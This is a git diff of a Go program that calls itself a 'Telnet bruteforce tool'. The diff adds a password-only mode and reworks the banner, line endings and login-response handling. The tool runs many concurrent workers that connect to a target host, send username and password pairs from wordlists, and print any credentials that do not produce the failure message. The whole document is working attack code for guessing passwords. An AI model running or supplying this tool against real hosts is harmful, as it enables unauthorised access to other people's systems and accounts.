@@ -29,7 +29,7 @@ const (
 	ERROR   ResultCode = -1
 	FAILURE ResultCode = 0
 	SUCCESS ResultCode = 1
-  SIGNAL ResultCode = 2
+	SIGNAL  ResultCode = 2
 )
 
 func main() {
@@ -38,29 +38,51 @@ func main() {
 	userlist := flag.String("u", "", "wordlist of usernames")
 	passlist := flag.String("w", "", "wordlist of passwords")
 	workerCount := flag.Int("t", 40, "number of threads")
+	passwordOnly := flag.Bool("op", false, "Only-password mode")
 	flag.Parse()
 
 	if flag.NArg() != 0 ||
 		*host == "" ||
-		*userlist == "" ||
+		(*userlist == "" && !*passwordOnly) ||
 		*passlist == "" {
-		fmt.Println("Usage: program -i host [-p port] -u userlist -w passlist [-t threads]")
+		fmt.Println("Usage: program -i host [-p port] -u userlist -w passlist [-t threads] [-op]")
 		return
 	}
 
-	fmt.Println("Telnet bruteforce tool")
-	fmt.Println("Host: " + *host)
-	fmt.Println("User wordlists: " + *userlist)
-	fmt.Println("Password wordlists: " + *passlist)
-	fmt.Printf("Port: %d\n", *port)
-	fmt.Printf("Threads: %d\n", *workerCount)
-	fmt.Printf("Error message: \"%s\"\n", FAILURE_MESSAGE)
+	if *userlist == "" {
+		*userlist = ".default_userlist.txt"
+	}
+
+  // Display program prompt
+  var texts []string
+  texts = append(texts, "Telnet bruteforce tool")
+  texts = append(texts, "Host: " + *host)
+	if !*passwordOnly {
+   texts = append(texts, "User wordlist: " + *userlist)
+	}
+  texts = append(texts, "Password wordlist: " + *passlist)
+  texts = append(texts, fmt.Sprintf("Port: %d",*port))
+  texts = append(texts, fmt.Sprintf("Threads: %d",*workerCount))
+  texts = append(texts, "Error message: " + FAILURE_MESSAGE)
+	if *passwordOnly {
+   texts = append(texts,"Password-only mode")
+	}
+	fmt.Println("+-------------------------------------------------+")
+  for _, text := range texts {
+    if len(text) > 48 {
+      text = text[:45] + "..."
+    }
+    fmt.Printf("| %-48s|\n", text)
+  }
+	fmt.Println("+-------------------------------------------------+")
 	fmt.Println()
+
+  // Operations
 	time.Sleep(time.Second)
-	bruteforceTelnet(*host, *userlist, *passlist, *port, *workerCount)
+	bruteforceTelnet(*host, *userlist, *passlist, *port, *workerCount, *passwordOnly)
 }
 
-func bruteforceTelnet(host, userlist, passlist string, port uint, threads int) {
+func bruteforceTelnet(host, userlist, passlist string, port uint, threads int, passwordOnly bool) {
 	// prepare files
 	usernameFile, err := os.Open(userlist)
 	if err != nil {
@@ -75,7 +97,7 @@ func bruteforceTelnet(host, userlist, passlist string, port uint, threads int) {
 		fmt.Printf("Error opening %s \n", passwordFile)
 		return
 	}
-	defer usernameFile.Close()
+	defer passwordFile.Close()
 	passwordFilescaner := bufio.NewScanner(passwordFile)
 
 	// prepare signals
@@ -89,7 +111,7 @@ func bruteforceTelnet(host, userlist, passlist string, port uint, threads int) {
 	resultsChan := make(chan ResultCode)
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
-		go worker(credentialsChan, resultsChan, host, port, &wg, validCredentialsChan)
+		go worker(credentialsChan, resultsChan, host, port, &wg, validCredentialsChan, passwordOnly)
 	}
 
 	// brute-force
@@ -128,26 +150,30 @@ func bruteforceTelnet(host, userlist, passlist string, port uint, threads int) {
 	go func() {
 		sig := <-signals
 		fmt.Printf("\n\n")
-    if sig != nil {
-		fmt.Println("Received signal:", sig)
-    }
+		if sig != nil {
+			fmt.Println("Received signal:", sig)
+		}
 		if len(validCredentials) != 0 {
 			fmt.Println("Credentials found:")
 			for _, cred := range validCredentials {
 				fmt.Println(Green + cred + Reset)
 			}
 		}
-    os.Exit(0)
+		os.Exit(0)
 	}()
 
-  for _ = range resultsChan {
+	for _ = range resultsChan {
 	} // just wait for the results
 }
 
-func worker(credentialsChan chan *Credentials, resultsChan chan ResultCode, host string, port uint, wg *sync.WaitGroup, validCredentialsChan chan *Credentials) {
+func worker(credentialsChan chan *Credentials, resultsChan chan ResultCode, host string, port uint, wg *sync.WaitGroup, validCredentialsChan chan *Credentials, passwordOnly bool) {
 	defer wg.Done()
 	for c := range credentialsChan {
-		fmt.Printf("Trying %s:%s\n", c.User, c.Password)
+		if passwordOnly {
+			fmt.Printf("Trying %s\n", c.Password)
+		} else {
+			fmt.Printf("Trying %s:%s\n", c.User, c.Password)
+		}
 		address := fmt.Sprintf("%s:%d", host, port)
 		// starting connection
 		conn, err := net.Dial("tcp", address)
@@ -159,7 +185,7 @@ func worker(credentialsChan chan *Credentials, resultsChan chan ResultCode, host
 		defer conn.Close()
 		time.Sleep(1 * time.Second)
 		// trying login
-		result := handleTelnetConnection(conn, c, validCredentialsChan)
+		result := handleTelnetConnection(conn, c, validCredentialsChan, passwordOnly)
 		resultsChan <- result
 	}
 }
@@ -207,7 +233,7 @@ const (
 	ENCRYPTION     Telnet_Option = 38
 )
 
-func handleTelnetConnection(conn net.Conn, credentials *Credentials, validCredentialsChan chan *Credentials) ResultCode {
+func handleTelnetConnection(conn net.Conn, credentials *Credentials, validCredentialsChan chan *Credentials, passwordOnly bool) ResultCode {
 	buf := bufio.NewReader(conn)
 	timeout := 1500 * time.Millisecond
 	for {
@@ -216,34 +242,46 @@ func handleTelnetConnection(conn net.Conn, credentials *Credentials, validCreden
 		if err != nil {
 			if os.IsTimeout(err) {
 				// send authentication
-				_, err = fmt.Fprintf(conn, credentials.User+"\n")
-				if err != nil {
-					fmt.Println("Error sending username: ", err)
-					return ERROR
+				if !passwordOnly {
+					_, err = fmt.Fprintf(conn, credentials.User+"\r")
+					if err != nil {
+						fmt.Println("Error sending username: ", err)
+						return ERROR
+					}
+					time.Sleep(1 * time.Second)
 				}
-
-				time.Sleep(1 * time.Second)
-				_, err = fmt.Fprintf(conn, credentials.Password+"\n")
+				_, err = fmt.Fprintf(conn, credentials.Password+"\r")
 				if err != nil {
 					fmt.Println("Error sending password: ", err)
 					return ERROR
 				}
 
+				// Read response
 				time.Sleep(1 * time.Second)
-
 				reader := bufio.NewReader(conn)
-				response := ""
-
-				for i := 0; i < 3; i++ {
-					conn.SetReadDeadline(time.Now().Add(timeout * 2))
-					response, err = reader.ReadString('\n')
+				authResponse := ""
+				n := 2
+				if passwordOnly {
+					n--
+				}
+				for i := 0; i < n; i++ {
+					conn.SetReadDeadline(time.Now().Add(timeout * 4))
+					_, err := reader.ReadString('\n')
 					if err != nil {
-						fmt.Println("Error reading string: ", err)
+						fmt.Println("Error reading line ", err)
 						return ERROR
 					}
 				}
+				conn.SetReadDeadline(time.Now().Add(timeout * 4))
+				authResponse, err = reader.ReadString('\n')
+				if err != nil {
+					fmt.Println("Error reading the string: ", err)
+					return ERROR
+				}
+				fmt.Print(authResponse)
+
 				// Handling the response
-				if strings.Contains(response, FAILURE_MESSAGE) {
+				if strings.Contains(authResponse, FAILURE_MESSAGE) {
 					return FAILURE
 				}
 				validCredentialsChan <- credentials
